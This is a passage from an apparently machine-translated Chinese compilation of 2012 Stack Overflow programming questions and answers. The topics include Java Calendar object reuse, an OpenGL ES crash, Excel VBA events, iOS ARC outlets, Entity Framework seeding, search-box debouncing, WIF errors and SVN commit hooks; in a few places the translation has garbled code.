      startC.setTimeInMillis(nu);
      endC.setTimeInMillis(nu + max);
      System.out.println("At creation time: " + startC.getTimeInMillis() + " / " + endC.getTimeInMillis());
      containerList.add(new Container(startC, endC));

      nu += max;
      i++;
    }
  }

  public void show()
  {

    for (Container c : containerList)
    {

      System.out.println("Start millis: " + c.getStart().getTimeInMillis() + " end millis "
          + c.getEnd().getTimeInMillis());
    }
  }

  /**
   * TEST
   * 
   * @param args
   */
  public static void main(String[] args)
  {

    BiggerContainer bc = new BiggerContainer();

    bc.init();

    bc.show();
  }

} 
```

输出：

```
At creation time: 1336480993036 / 1337085793036
At creation time: 1337085793036 / 1337690593036
At creation time: 1337690593036 / 1338295393036
At creation time: 1338295393036 / 1338900193036
At creation time: 1338900193036 / 1339504993036
At creation time: 1339504993036 / 1340109793036

Start millis: 1339504993036 end millis 1340109793036
Start millis: 1339504993036 end millis 1340109793036
Start millis: 1339504993036 end millis 1340109793036
Start millis: 1339504993036 end millis 1340109793036
Start millis: 1339504993036 end millis 1340109793036
Start millis: 1339504993036 end millis 1340109793036 
```

正如您在 init() 方法中创建 Container 实例期间看到的那样，Calendar 实例提供了正确数量的毫秒，而在 show 方法中，它们打印所有相同的毫秒...

你有什么主意吗？我的印象是这是一个非常新的错误，但我无法弄清楚我做错了什么

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-08T13:01:59.467

您正在为所有容器重用同一个日历实例（startC 和 endC）。在构造函数中创建日历的“克隆”/“副本”或在循环中创建日历实例。

```
 public Container(Calendar start, Calendar end)
  {

    this.start = (Calendar) start.clone();
    this.end = (Calendar) end.clone();
  } 
```

或者

```
while (i <= 5)
{
  Calendar startC = Calendar.getInstance();
  Calendar endC = Calendar.getInstance();
  startC.setTimeInMillis(nu);
  endC.setTimeInMillis(nu + max);
  System.out.println("At creation time: " + startC.getTimeInMillis() 
          + " / " + endC.getTimeInMillis());
  containerList.add(new Container(startC, endC));

  nu += max;
  i++;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-08T13:04:05.143

您可以将时间戳存储在`Container`对象中，例如

```
containerList.add(new Container(startC.getTime(), endC.getTime())); 
```

那么您将不会有重新使用日历实例的问题。正如我认为的那样，这将更有效率。

# iphone - 如何在鱼的运动中画一条线（iPhone中的OpenGLES）？

> ID：10499077
> 
> 赞同：1
> 
> 时间：2012-05-08T12:58:11.260
> 
> 标签：iphone, opengl-es

我正在使用 OpenGLES 框架在一个简单的 iPhone 游戏应用程序中工作。`I facing an "EXC Bad Access" error while draw a line on the images`. 在这里，我将向您解释我做了什么以及我在项目中尝试了什么。

步骤：1 我画了一个`Background Image used GL_TRIANGLE_STRIP`. 这是我的示例代码，

```
 - (void)viewDidLoad
    {
        [super viewDidLoad];

        self.context = [[EAGLContext alloc] initWithAPI:kEAGLRenderingAPIOpenGLES2]; 

        Test = NO;
        Test1 = NO;

        if (!self.context)
        {
            NSLog(@"Failed to create ES context");
        }

        GLKView *view = (GLKView *)self.view;
        view.context = self.context;
        [EAGLContext setCurrentContext:self.context];

        self.effect = [[GLKBaseEffect alloc] init];

        GLKMatrix4 projectionMatrix = GLKMatrix4MakeOrtho(0, 480, 0, 320, -1024, 1024);

        self.effect.transform.projectionMatrix = projectionMatrix;
        self.player = [[SGGSprite alloc] initWithFile:@"bg.png" effect:self.effect];    
        self.player.position = GLKVector2Make(self.player.contentSize.width, 460); 
        self.children = [NSMutableArray array];
        [self.children addObject:self.player];    
    }

    - (void)glkView:(GLKView *)view drawInRect:(CGRect)rect 
    {
    //  glClearColor(1, 1, 1, 1);
    //  glClear(GL_COLOR_BUFFER_BIT);
        glBlendFunc(GL_SRC_ALPHA, GL_ONE_MINUS_SRC_ALPHA);
        glEnable(GL_BLEND);

    // Condition satisfied to draw a line code given below, otherwise the background and fish image draw in else part.
        if(Test1 == YES)
        {
            GLKView *view = (GLKView *)self.view;
            view.context = self.context;
            view.drawableDepthFormat = GLKViewDrawableDepthFormat24;

            self.effect = [[GLKBaseEffect alloc] init];
            [self.effect  prepareToDraw];

            const GLfloat line[] = 
            {
                0.0f, 0.5f,
               -3.0f,-1.0f,
            };

            GLuint bufferObjectNameArray;
            glGenBuffers(1, &bufferObjectNameArray);
            glBindBuffer(GL_ARRAY_BUFFER, bufferObjectNameArray);
            glBufferData(
                        GL_ARRAY_BUFFER,   // the target buffer 
                        sizeof(line),      // the number of bytes to put into the buffer
                        line,              // a pointer to the data being copied 
                        GL_STATIC_DRAW);   // the usage pattern of the data 

            glEnableVertexAttribArray(GLKVertexAttribPosition);
            glVertexAttribPointer(
                                  GLKVertexAttribPosition, 
                                  2,                       // number of coordinates per vertex 
                                  GL_FLOAT,                // the data type of each component 
                                  GL_FALSE,                // can the data be scaled 
                                  2*4,                    
                                  NULL);                 
            glDrawArrays(GL_LINES, 0, 2);
        }
        else
        {
            //SGGSprite is another class and self.children is mutable array.
            for (SGGSprite * sprite in self.children)
            {
                [sprite render]; 
            }
        }
    }

    //render method in SGGSprite class to draw a fish and background image
    - (void)render
    {
        self.effect.texture2d0.name = self.textureInfo.name;
        self.effect.texture2d0.enabled = YES;
        self.effect.transform.modelviewMatrix = self.modelMatrix;

        [self.effect prepareToDraw];

        long offset = (long)&_quad; 
        glEnableVertexAttribArray(GLKVertexAttribPosition);
        glEnableVertexAttribArray(GLKVertexAttribTexCoord0);
        NSLog(@"TexturedVertex:%ld",offset);

        glVertexAttribPointer(GLKVertexAttribPosition, 2, GL_FLOAT, GL_FALSE, sizeof(TexturedVertex), (void *) (offset + offsetof(TexturedVertex, geometryVertex)));
        glVertexAttribPointer(GLKVertexAttribTexCoord0, 2, GL_FLOAT, GL_FALSE, sizeof(TexturedVertex), (void *) (offset + offsetof(TexturedVertex, textureVertex)));
        glDrawArrays(GL_TRIANGLE_STRIP, 0, 4);    
    } 
```

步骤：2 在我为我的视图绘制背景图像后，我要去`draw a fish images in the screen by using GL_TRIANGLE_STRIP`。鱼的图像总是在移动。这是我的示例代码，

*   (void)update { if(Test == NO) { self.timeSinceLastSpawn += self.timeSinceLastUpdate; if (self.timeSinceLastSpawn > 2.0) { self.timeSinceLastSpawn = 0; [自我目标]; // 添加鱼图片 }

    ```
     for (SGGSprite * sprite in self.children)
        {
            [sprite update:self.timeSinceLastUpdate];
        }
    } 
    ```

    }

    *   (void)target { SGGSprite * target = [[SGGSprite alloc] initWithFile:@"img2.png" effect:self.effect]; [self.children addObject:target]; // 在 NSMutable 数组中添加鱼图像

        int minY = target.contentSize.height/2; int maxY = 320 - target.contentSize.height/2; int rangeY = maxY - minY; int actualY = (arc4random() % rangeY) + minY;

        如果（实际 Y <= 100）{实际 Y = 215; }

        target.position = GLKVector2Make(480 + (target.contentSize.width), actualY);
        int minVelocity = 480.0/12.0; int maxVelocity = 480.0/6.0; int rangeVelocity = maxVelocity - minVelocity; int actualVelocity = (arc4random() % rangeVelocity) + minVelocity; target.moveVelocity = GLKVector2Make(-actualVelocity, 0); }

    *   (void)glkView:(GLKView *)view drawInRect:(CGRect)rect { // glClearColor(1, 1, 1, 1); // glClear(GL_COLOR_BUFFER_BIT); glBlendFunc(GL_SRC_ALPHA, GL_ONE_MINUS_SRC_ALPHA); glEnable(GL_BLEND);

    // 条件满足绘制下面给出的线条代码，否则在else部分绘制背景和鱼图。if(Test1 == YES) { GLKView *view = (GLKView *)self.view; view.context = self.context; view.drawableDepthFormat = GLKViewDrawableDepthFormat24;

    ```
     self.effect = [[GLKBaseEffect alloc] init];
        [self.effect  prepareToDraw];

        const GLfloat line[] = 
        {
            0.0f, 0.5f,
           -3.0f,-1.0f,
        };

        GLuint bufferObjectNameArray;
        glGenBuffers(1, &bufferObjectNameArray);
        glBindBuffer(GL_ARRAY_BUFFER, bufferObjectNameArray);
        glBufferData(
                    GL_ARRAY_BUFFER,   // the target buffer 
                    sizeof(line),      // the number of bytes to put into the buffer
                    line,              // a pointer to the data being copied 
                    GL_STATIC_DRAW);   // the usage pattern of the data 

        glEnableVertexAttribArray(GLKVertexAttribPosition);
        glVertexAttribPointer(
                              GLKVertexAttribPosition, 
                              2,                       // number of coordinates per vertex 
                              GL_FLOAT,                // the data type of each component 
                              GL_FALSE,                // can the data be scaled 
                              2*4,                    
                              NULL);                 
        glDrawArrays(GL_LINES, 0, 2);
    }
    else
    {
        //SGGSprite is another class and self.children is mutable array.
        for (SGGSprite * sprite in self.children)
        {
            [sprite render]; 
        }
    } 
    ```

    }

步骤：3 现在我在屏幕上绘制背景图像和鱼图像。它工作完美。现在正在进入`to draw a white line (using GL_LINE)`鱼图像和背景图像上方的屏幕。当我使用下面的代码画一条线时，

-(void) touchesBegan:(NSSet *)touches withEvent:(UIEvent *)event { Test = YES; 测试1 = 是；}

```
- (void)update
{
    if(Test == NO)
    {
        self.timeSinceLastSpawn += self.timeSinceLastUpdate;
        NSLog(@"timeSinceLastUpdate:%f",self.timeSinceLastUpdate);
        if (self.timeSinceLastSpawn > 2.0)
        {
            self.timeSinceLastSpawn = 0;
            [self target];
        }

        NSLog(@"Children count:%d",[self.children count]);
        for (SGGSprite * sprite in self.children)
        {
            [sprite update:self.timeSinceLastUpdate];
        }
    }
}

- (void)glkView:(GLKView *)view drawInRect:(CGRect)rect 
{
//  glClearColor(1, 1, 1, 1);
//  glClear(GL_COLOR_BUFFER_BIT);
    glBlendFunc(GL_SRC_ALPHA, GL_ONE_MINUS_SRC_ALPHA);
    glEnable(GL_BLEND);

// Condition satisfied to draw a line code given below, otherwise the background and fish image draw in else part.
    if(Test1 == YES)
    {
        GLKView *view = (GLKView *)self.view;
        view.context = self.context;
        view.drawableDepthFormat = GLKViewDrawableDepthFormat24;

        self.effect = [[GLKBaseEffect alloc] init];
        [self.effect  prepareToDraw];

        const GLfloat line[] = 
        {
            0.0f, 0.5f,
           -3.0f,-1.0f,
        };

        GLuint bufferObjectNameArray;
        glGenBuffers(1, &bufferObjectNameArray);
        glBindBuffer(GL_ARRAY_BUFFER, bufferObjectNameArray);
        glBufferData(
                    GL_ARRAY_BUFFER,   // the target buffer 
                    sizeof(line),      // the number of bytes to put into the buffer
                    line,              // a pointer to the data being copied 
                    GL_STATIC_DRAW);   // the usage pattern of the data 

        glEnableVertexAttribArray(GLKVertexAttribPosition);
        glVertexAttribPointer(
                              GLKVertexAttribPosition, 
                              2,                       // number of coordinates per vertex 
                              GL_FLOAT,                // the data type of each component 
                              GL_FALSE,                // can the data be scaled 
                              2*4,                    
                              NULL);                 
        glDrawArrays(GL_LINES, 0, 2);
    }
    else
    {
        //SGGSprite is another class and self.children is mutable array, Draw a fish and background image
        for (SGGSprite * sprite in self.children)
        {
            [sprite render]; 
        }
    }
} 
```

应用程序在“glDrawArrays(GL_TRIANGLE_STRIP, 0, 4); // 错误 - 当我触摸屏幕时发生错误”

*   (void)render { self.effect.texture2d0.name = self.textureInfo.name; self.effect.texture2d0.enabled = 是；self.effect.transform.modelviewMatrix = self.modelMatrix;

    ```
    [self.effect prepareToDraw];

    long offset = (long)&_quad; 
    glEnableVertexAttribArray(GLKVertexAttribPosition);
    glEnableVertexAttribArray(GLKVertexAttribTexCoord0);
    NSLog(@"TexturedVertex:%ld",offset);

    glVertexAttribPointer(GLKVertexAttribPosition, 2, GL_FLOAT, GL_FALSE, sizeof(TexturedVertex), (void *) (offset + offsetof(TexturedVertex, geometryVertex)));
    glVertexAttribPointer(GLKVertexAttribTexCoord0, 2, GL_FLOAT, GL_FALSE, sizeof(TexturedVertex), (void *) (offset + offsetof(TexturedVertex, textureVertex)));
    glDrawArrays(GL_TRIANGLE_STRIP, 0, 4);  // ERROR comes from this line, when i touch the screen. 
    ```

    }

您能否参考这些代码并告诉我的代码有什么问题？我应该怎么做才能解决这个问题？请帮我。提前致谢。

# excel - 在单元格更新时运行宏 - 将 excel 数据导出到 sql server 数据库

> ID：10499079
> 
> 赞同：0
> 
> 时间：2012-05-08T12:58:12.923
> 
> 标签：excel, vba

每当更新 Excel 电子表格中的单元格时，如何自动运行宏？

```
Private Sub Worksheet_Change(ByVal Target As Range) 

If Target.Address = "A1" And Target.Value > 0 Then 
    MsgBox ("A1 has changed.") 
    Application.Run("A1Changed") 
End If

End Sub 
```

但这只是在价值变为正数时。当对 A1 进行任何更改时，如何让这个宏开始执行？此外，使用 Private Sub 是否意味着这将不断监视我的电子表格的更新？

我的问题是在更新或更改单元格时将数据从 excel 导出到 SQL Server。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-08T13:10:02.737

嗯，删除部分“And Target.Value > 0”

VBA Private Sub 只能从它所在的模块中的任何位置调用。

# iphone - 视图控制器的 UI 元素的所有者是什么？iOS5 带 ARC

> ID：10499080
> 
> 赞同：1
> 
> 时间：2012-05-08T12:58:17.110
> 
> 标签：iphone, ios, memory-management, ios5, automatic-ref-counting

我是 iOS 5 的新手。从 Apple 的文档中，我知道 ARC 是什么以及“对象的所有者应该使用`strong`符号”。读完“Hello World”后，我注意到一件奇怪的事情。（我的意思是这让我很困惑）

HelloWorldAppDelegate：

```
@interface HelloWorldAppDelegate : UIResponder <UIApplicationDelegate>

@property (strong, nonatomic) UIWindow *window;

@end 
```

HelloWorldViewController：

```
#import <UIKit/UIKit.h>

@interface HelloWorldViewController : UIViewController <UITextFieldDelegate>
@property (weak, nonatomic) IBOutlet UITextField *textField;
@property (weak, nonatomic) IBOutlet UILabel *label;
- (IBAction)changeGreeting:(id)sender;

@property (copy, nonatomic) NSString *userName;
@end 
```

这里：

```
@property (weak, nonatomic) IBOutlet UITextField *textField;
@property (weak, nonatomic) IBOutlet UILabel *label; 
```

UI 元素有`weak`符号，并且没有文件有`strong`对它们的引用。所以我很困惑`what/who hold them?`

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-08T13:30:06.160

在我看来，您可以将 NIB/XIB 视为这些对象的所有者。你的班级都不拥有它们。请参阅资源编程指南中[的“管理来自 Nib 文件的对象的生命周期”：](https://developer.apple.com/library/ios/#documentation/Cocoa/Conceptual/LoadingResources/CocoaNibs/CocoaNibs.html#//apple_ref/doc/uid/10000051i-CH4-SW6)

> 从实际的角度来看，在 iOS 和 OS X 中的 outlet 应该被定义为声明的属性。**出口通常应该是`weak`**，除了从文件所有者到 nib 文件中的顶级对象（或者，在 iOS 中，故事板场景）应该是`strong`. 因此，您创建的 Outlets 通常默认情况下应该很弱，因为：
> 
> *   您为例如视图控制器的视图或窗口控制器的窗口的子视图创建的 Outlets 是对象之间的任意引用，并不暗示所有权。
> *   强插座通常由框架类指定（例如，`UIViewController`'`view`插座或`NSWindowController`'`window`插座）。

# c# - Lambda 表达式和实体框架，如何获取对在另一个方法中创建的对象的引用

> ID：10499084
> 
> 赞同：0
> 
> 时间：2012-05-08T12:58:22.093
> 
> 标签：c#, entity-framework, entity-framework-4

所以，我的 ef 模型有以下初始化程序。

为简化起见，我有一个车辆、一个客户、一个地址实体。我用一种方法创建了地址实体。现在我需要创建客户实体，但如何将地址值分配给现有对象？

```
public class DevelopmentInitializer
    {
        /// <summary>
        /// This class allows the database tables to be created and seed at runtime.
        /// </summary>
        public class AskAndTrackInitializer : DropCreateDatabaseAlways<AskAndTrackContext>
        {
            /// <summary>
            /// This fills the database with sample data to start with
            /// </summary>
            /// <param name="context">DBContext required for the connection</param>
            protected override void Seed(AskAndTrackContext context)
            {
                BuildDealers(context);
                BuildRequesters(context);
                BuildAddresses(context);
                BuildCustomers(context);
                BuildVehicles(context);

                BuildWorkflowsBase(context);
            }

            private void BuildDealers(AskAndTrackContext context)
            {
                var dealer1 = new Dealer {DealerId = 1, Name = "Dealer 1"};
                var dealer2 = new Dealer { DealerId = 2, Name = "Dealer 2" };
                var dealer3 = new Dealer { DealerId = 3, Name = "Dealer 3" };
                var dealer4 = new Dealer { DealerId = 4, Name = "Dealer 4" };
                var dealer5 = new Dealer { DealerId = 5, Name = "Dealer 5" };

                context.Dealers.Add(dealer1);
                context.Dealers.Add(dealer2);
                context.Dealers.Add(dealer3);
                context.Dealers.Add(dealer4);
                context.Dealers.Add(dealer5);

            }

            /// <summary>
            /// Requesters test data
            /// </summary>
            private void BuildRequesters(AskAndTrackContext context)
            {
                var requester1 = new Requester {EmailAddress = "le.xx@hotmail.com", Name="Andres x", RequesterId=1};
                var requester2 = new Requester { EmailAddress = "le.xxx@hotmail.com", Name = "Andres y", RequesterId = 2 };
                var requester3 = new Requester { EmailAddress = "le.yyy@hotmail.com", Name = "Juan l", RequesterId = 3 };
                var requester4 = new Requester { EmailAddress = "le.zzzz@hotmail.com", Name = "Peter x", RequesterId = 4 };
                var requester5 = new Requester { EmailAddress = "le.aaaa@hotmail.com", Name = "Patrick z", RequesterId = 5 };

                context.Requesters.Add(requester1);
                context.Requesters.Add(requester2);
                context.Requesters.Add(requester3);
                context.Requesters.Add(requester4);
                context.Requesters.Add(requester5);

            }

            /// <summary>
            /// Workflow base test data and its related objects
            /// </summary>
            private void BuildWorkflowsBase(AskAndTrackContext context)
            {

            }

            /// <summary>
            /// Vehicle test data
            /// </summary>
            private void BuildVehicles(AskAndTrackContext context)
            {
                //var vehicle1
            }

            /// <summary>
            /// Customers test data
            /// </summary>
            private void BuildCustomers(AskAndTrackContext context)
            {
                //var customer1 = new Customer{Address = ???

            }

            private void BuildAddresses(AskAndTrackContext context)
            {
                var address1 = new Address
                                    {
                                        AddressId = 1,
                                        Box = "71",
                                        City = "Antwerp",
                                        Number = "1",
                                        Street = "Belgielei",
                                        Zip = "2018"
                                    };

                var address2 = new Address
                                    {
                                        AddressId = 2,
                                        Box = "21",
                                        City = "Antwerp",
                                        Number = "1",
                                        Street = "Lange Leemstraat",
                                        Zip = "2018"
                                    };

                var address3 = new Address
                                    {
                                        AddressId = 3,
                                        Box = "23",
                                        City = "Antwerp",
                                        Number = "1",
                                        Street = "Lamoriniestraat",
                                        Zip = "2018"
                                    };

                var address4 = new Address
                                    {
                                        AddressId = 4,
                                        Box = "24",
                                        City = "Antwerp",
                                        Number = "1",
                                        Street = "De Keyserlei",
                                        Zip = "2000"
                                    };

                var address5 = new Address
                                    {
                                        AddressId = 5,
                                        Box = "34",
                                        City = "Antwerp",
                                        Number = "1",
                                        Street = "Italialei",
                                        Zip = "2020"
                                    };

                context.Addresses.Add(address1);
                context.Addresses.Add(address2);
                context.Addresses.Add(address3);
                context.Addresses.Add(address4);
                context.Addresses.Add(address5);

            }
        } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-08T13:26:39.237

在 EF Code First 中，您必须声明两个实体之间的关系，并声明子实体中的子实体列表

```
public List<ChildeEntity> ChildEntities { get; set; } 
```

然后，如果您创建一个 ChildEntity：

```
var newChild = new ChildEntity(); 
```

并将其添加到父实体列表中：

```
parentEntity.ChildEntities.Add(newChild); 
```

如果父实体在上下文中，则 newChild 将自动放入上下文中，并且当您更改更改时，将在 newChild 中设置子实体的必要属性（FK 属性），然后将更改保存到数据库中。

因此，答案是：只需将其添加到父列表中即可。

实际上，这种关系可以通过 3 种方式表达：

*   父级的子实体列表
*   子实体中指向父实体的属性
*   FK（可以包含在实体中或不包含在实体中）

如果您在上下文中工作，则无论何时更改 3 个属性中的任何一个，都会在上下文中相应地更正其他属性。

所以答案可以包括更改任何其他属性。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-08T13:08:28.290

我看到两个选项：（与 lambda 表达式无关；）

1.  你可以`BuildCustomers`从里面打电话`BuildAdresses`；

    ```
    private void BuildAddresses(AskAndTrackContext context)
    {
        var listAddress = new List<Address>();
        // create adresses, populate listAdress with the Address objects. 
        BuildCustomers(AskAndTrackContext context, listAddress);
    } 
    ```

2.  `BuildAdresses`可以返回 ID 列表，并将列表作为参数传递给`BuildCustomers`.

    ```
    List<Address> addresses = BuildAddresses(context);
    BuildCustomers(context, addresses); 
    ```

不要忘记`context.SaveChanges()`在每个填充函数的末尾调用。这样 Entity 就会知道您传递的对象是表中的一个元素。

两种解决方案都会做同样的事情，但可读性会有所不同。

# c++ - 我如何通过 boost 使用线程池库？

> ID：10499085
> 
> 赞同：0
> 
> 时间：2012-05-08T12:58:22.907
> 
> 标签：c++, boost, pool

我复制了/usr/include/boost下的boost hpp文件，发布版本是1.37.0，我还复制了/usr/include/boost下的threadpool hpp文件。

运行`gcc quickstart.cpp -o test`编译失败并显示以下输出。

编译日志输出：

```
$ g++ quickstart.hpp -o test
/tmp/cctYmYW8.o:quickstart.cpp (.text$_ZN5boost16thread_exceptionC2ERKS0_[boost::thread_exception::thread_exception(boost::thread_exception const&)]+0x1d): undefined reference to vtable for boost::thread_exception
/tmp/cctYmYW8.o:quickstart.cpp:(.text$_ZN5boost21thread_resource_errorC1ERKS0_[boost::thread_resource_error::thread_resource_error(boost::thread_resource_error const&)]+0x1d): undefined reference tovtable for boost::thread_resource_error'
/usr/lib/gcc/i686-pc-cygwin/4.5.3/../../../../i686-pc-cygwin/bin/ld:
/tmp/cctYmYW8.o: bad reloc address 0x1d in section `.text$_ZN5boost21thread_resource_errorC1ERKS0_[boost::thread_resource_error::thread_resource_error(boost::thread_resource_error const&)]' collect2: ld 
```

以上步骤正确吗？

# facebook-graph-api - 获取哪些用户分享了帖子

> ID：10499088
> 
> 赞同：5
> 
> 时间：2012-05-08T12:58:31.307
> 
> 标签：facebook-graph-api, share, feed

使用graph api，当我查询用户或页面的提要时，有一些用户已分享的帖子，我可以在一个实体的数据部分中看到有关分享数量的数据：

```
 "shares": {
    "count": 2
  }, 
```

浏览 facebook 时，在该帖子上，当我单击代表“显示共享”的图标时，会弹出一些内容，让我看到一些共享该帖子的用户，根据评论“您只能看到公开的共享或来自朋友们。” 那么有没有办法通过图形 api 从共享中获取用户数据？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-22T13:18:52.030

API 不提供有关共享帖子/链接的用户的信息。这可能是他们将来会添加的东西，但目前还不可能。获取此信息的最佳选择是抓取 UI 以获取此信息，但您会遇到很多问题，而且可能不值得付出努力。

Facebook 确实提供了关于谁喜欢和评论帖子的信息，如果它有任何安慰的话。

# sql-server - SQL Server 报告服务基础知识

> ID：10499089
> 
> 赞同：0
> 
> 时间：2012-05-08T12:58:31.480
> 
> 标签：sql-server, reporting-services

我正在进行的这个项目让我使用了我很新的 SQL Server 2008 R2。我有完整版的 SQL Server 和 SSIS、SSAS 等。我对报告服务一无所知。我可以连接到报表服务器，但无论如何我都看不到实际构建报表。顺便说一句，这一切都在管理工作室。是否有用于构建报告的 GUI 界面？我必须假设该软件与 SSMS 不同？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-08T13:33:58.357

您必须安装 BIDS（商业智能开发工作室）。它在您的 SQL Server 设置中。也许您已经这样做了，请查看开始菜单中的 Visual Studio 目录。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-08T13:52:57.147

是的，它可以这样安装。

Business Intelligence Development Studio 是使用 SSIS 功能的必备工具。

# .net - .net ontextchanged，等到用户写完

> ID：10499090
> 
> 赞同：1
> 
> 时间：2012-05-08T12:58:34.377
> 
> 标签：.net, vb.net, winforms

我有一个查询数据库并在下面的框中显示结果的搜索框。当我使用 ontextchanged 事件时，这有点慢，因为每次写入新字母时都会查询数据库。

我怎样才能让它只在用户写完之后才进行查询，或者每次用户休息一下？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2014-03-14T17:08:08.660

我对此的解决方案是在每次更改密钥时触发 Timer。我跟踪文本更改的次数，并将其与计时器过期的次数进行比较。如果两个数字相等，则调用该方法。注意：MySearchMethod() 是用户停止输入后触发的方法，而 txtQuickSearch 是用户正在输入的文本框的 ID。

```
Private mint_LastReceivedTimerID As Integer = 0
Private mint_LastInitializedTimerID As Integer = 0

Private Sub txtQuickSearch_TextChanged(ByVal sender As System.Object, ByVal e As System.Windows.Controls.TextChangedEventArgs) Handles txtQuickSearch.TextChanged
    'Increment the counter for the number of times the textbox has been changed
    mint_LastInitializedTimerID = mint_LastInitializedTimerID + 1

    'Wait longer for shorter strings or strings without spaces
    Dim intMilliseconds As Integer = 500
    If txtQuickSearch.Text.Length >= 6 Then
        intMilliseconds = 250
    End If
    If txtQuickSearch.Text.Contains(" ") = True And txtQuickSearch.Text.EndsWith(" ") = False Then
        intMilliseconds = 175
    End If

    Dim objTimer As New System.Timers.Timer(intMilliseconds)
    AddHandler objTimer.Elapsed, AddressOf txtQuickSearch_TimerElapsed

    objTimer.AutoReset = False
    objTimer.Enabled = True
End Sub

Private Sub txtQuickSearch_TimerElapsed(ByVal sender As Object, ByVal e As System.Timers.ElapsedEventArgs)
    'Increment the counter for the number of times timers have elapsed
    mint_LastReceivedTimerID = mint_LastReceivedTimerID + 1

    'If the total number of textbox changes equals the total number of times timers have elapsed (fire method for only the latest character change)
    If mint_LastReceivedTimerID = mint_LastInitializedTimerID Then
        'Fire method on the Main UI Thread
        Me.Dispatcher.Invoke(Sub() MySearchMethod(), System.Windows.Threading.DispatcherPriority.Normal)
    End If
End Sub 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-08T13:07:44.180

最简单的方法是记录最后一次 OnTextChanged 发生的时间。如果当前时间大于 N，则调用 web 服务。

另一种方法是每 N 毫秒开始一个重复时间，然后使用 lastText 检查文本，如果不相等则调用 Web 服务。如果您这样做，请使用 System.Windows.Form.Timer 以便在您从搜索框中获取当前文本时在 UI 上执行回调。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-08T13:03:18.507

也许以 500 毫秒（半秒）的间隔连接一个 Timer 对象，并在 .onTextChanged 事件触发时启动它。然后当计时器“滴答”时，使用该事件将查询触发到数据库？

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-09T03:40:13.507

尝试这个：

```
Const WaitInterval As Integer = 5   '5 seconds <-- change this to control speed
Dim WithEvents MyTimer As New Timers.Timer

Private Sub Form1_Load(sender As System.Object, e As System.EventArgs) Handles MyBase.Load
    MyTimer.Interval = WaitInterval * 1000
    MyTimer.AutoReset = False
End Sub

Private Sub TextBox1_TextChanged(sender As System.Object, e As System.EventArgs) Handles TextBox1.TextChanged
    MyTimer.Stop()
    MyTimer.Start()
End Sub

Private Sub MyTimer_Elapsed(sender As Object, e As System.Timers.ElapsedEventArgs) Handles MyTimer.Elapsed

    '' -- call your method to query database here --

End Sub 
```

# asp.net - Windows 身份基础/更新面板/错误 401

> ID：10499093
> 
> 赞同：0
> 
> 时间：2012-05-08T12:58:42.397
> 
> 标签：asp.net, updatepanel, wif

我最近使用 wif 创建了一个声明感知网络应用程序。这个应用程序包含一个动态加载用户控件的更新面板，一切似乎都很好，但有时当应用程序为更新面板执行异步请求时，我会收到 401 错误，但 fedauth cookie 仍然存在并且具有有效的生命周期，也sts 会话 cookie。我尝试实现滑动会话，但如果有人可以在这里阐明一些问题，错误似乎仍然存在。

顺便说一句，我在客户端应用程序上的 web.config 看起来像这样

```
<federatedAuthentication>
    <wsFederation passiveRedirectEnabled="true" persistentCookiesOnPassiveRedirects="true" issuer="https://stsissuerurl" realm="http://webapp.com" requireHttps="false" />
    <cookieHandler requireSsl="false" persistentSessionLifetime="05:00:00" />
  </federatedAuthentication> 
```

问候

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-09T01:45:04.503

您是否启用了 WIF 跟踪并查看是否有任何线索？[WIF 追踪](http://msdn.microsoft.com/en-us/library/ee517282.aspx)

# c# - windows phone中的foursquare照片签入

> ID：10499095
> 
> 赞同：0
> 
> 时间：2012-05-08T12:58:50.097
> 
> 标签：c#, api, windows-phone-7, foursquare

有人知道如何在windows phone 中使用foursquare photo check-in 吗？

我看过下面的链接，但它没有帮助。我必须上传照片

[Foursquare SDK for .net](https://stackoverflow.com/questions/4460012/foursquare-sdk-for-net)

提前致谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-08T23:36:01.483

查看 Foursquare api，[签到](https://developer.foursquare.com/docs/checkins/add)事件似乎不接受照片参数。您很可能需要发布签到，然后[发布照片](https://developer.foursquare.com/docs/photos/add)并在该帖子中引用签到 ID。

如果这是您正在寻找的，第 3 方 sdk 可能会为您打包一个电话，但我对任何一个都不熟悉。

如果您正在查看如何将照片添加到发布请求，请查看[此帖子](https://stackoverflow.com/questions/5032861/rest-windows-phone-photo-upload/5063071#5063071)。

# localization - Struts 中的 MessageResources 不适用于亚洲语言...但返回 ?????? 反而

> ID：10499097
> 
> 赞同：0
> 
> 时间：2012-05-08T12:59:20.637
> 
> 标签：localization, resources, struts, message

Struts 中的 MessageResources 不适用于亚洲语言...但返回 ?????? 相反。我该如何处理，因为它适用于其他语言。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-08T13:17:19.173

我会阅读 MessageResources - 这是一篇有用的文章[http://www.selbyinc.com/technology/struts-messageresources.html](http://www.selbyinc.com/technology/struts-messageresources.html)

如果您没有默认的 messages.properties 文件，那么您需要为每个用户区域设置一个，称为（例如）messages_languagecode.properties（例如，对于英语，messages_en.properties）

# svn - 如果 Jira Issue 密钥不在提交消息中，则限制 Subversion 提交

> ID：10499098
> 
> 赞同：5
> 
> 时间：2012-05-08T12:59:20.963
> 
> 标签：svn, commit, jira

我使用 SVN-1.7.4 进行修订控制，并使用 atlassian JIRA 作为我的 LAMP 网站的问题跟踪器。如果我的任何团队成员提交但未提及相同的 Jira 问题密钥，我想限制 SVN 提交。我正在使用独立的 JIRA 并将其安装在我的服务器上。谷歌搜索给了我 Subversion Jira 插件 (https://studio.plugins.atlassian.com/wiki/display/SVN/Subversion+JIRA+plugin) 但它只能帮助我跟踪具有 JIRA 密钥的提交，而不是在限制他们。如果我应该发布有关该问题的更多细节，请告诉我。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2014-09-11T16:26:20.140

